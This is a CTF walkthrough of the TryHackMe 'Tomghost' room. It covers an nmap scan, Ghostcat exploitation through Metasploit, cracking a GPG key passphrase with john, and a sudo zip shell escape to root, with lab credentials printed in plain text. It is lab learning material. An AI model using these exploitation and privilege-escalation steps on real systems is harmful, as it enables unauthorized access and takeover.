# Tomghost tryhackme write-up



### Nmap

```bash
# Nmap 7.91 scan initiated Wed Jan 19 20:20:11 2022 as: nmap -sV -sC -oA nmap/tomghost 10.10.247.170
Nmap scan report for 10.10.247.170
Host is up (0.23s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 19 20:21:10 2022 -- 1 IP address (1 host up) scanned in 58.99 seconds

```

Tomcat exploit: https://apkash8.medium.com/hunting-and-exploiting-apache-ghostcat-b7446ef83e74

run metasploit search exploit ghost use exploit run your get ssh passwd

	skyfuck:8730281lkjlkjdqlksalks

### skyfuck to merlin

Using PGP encryption encrypt the file _credential.pgp_  to decrypt

Import the key:

	gpg --import tryhackme.asc

Decrypt the file:

	gpg --decrypt credentials.pgp

but its ask passwd 

lets do crack tryhackme.asc using gpg2john

```bash
┌──(arundhanush㉿kali)-[~/CTF/THM/tomghost]
└─$ gpg2john tryhackme.asc > hash                                       

File tryhackme.asc
                                                                                                                                                                      
┌──(arundhanush㉿kali)-[~/CTF/THM/tomghost]
└─$ cat hash         
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc
                                                                                                                                                                      
┌──(arundhanush㉿kali)-[~/CTF/THM/tomghost]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)
1g 0:00:00:00 DONE (2022-01-19 21:09) 2.380g/s 2552p/s 2552c/s 2552C/s chinita..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed
                           
```

now enter the passwd 

```bash
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

we got it

## Privesc

Privesc using zip

```bash
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip

```

TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF

```bash
merlin@ubuntu:~$ mktemp -u
/tmp/tmp.b6PBkM4k8w
merlin@ubuntu:~$ sudo zip /tmp/tmp.b6PBkM4k8w /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root

```

roooted!

## References

https://apkash8.medium.com/hunting-and-exploiting-apache-ghostcat-b7446ef83e74

https://www.dummies.com/article/technology/computers/operating-systems/linux/how-to-use-gpg-in-linux-to-encrypt-files-255873
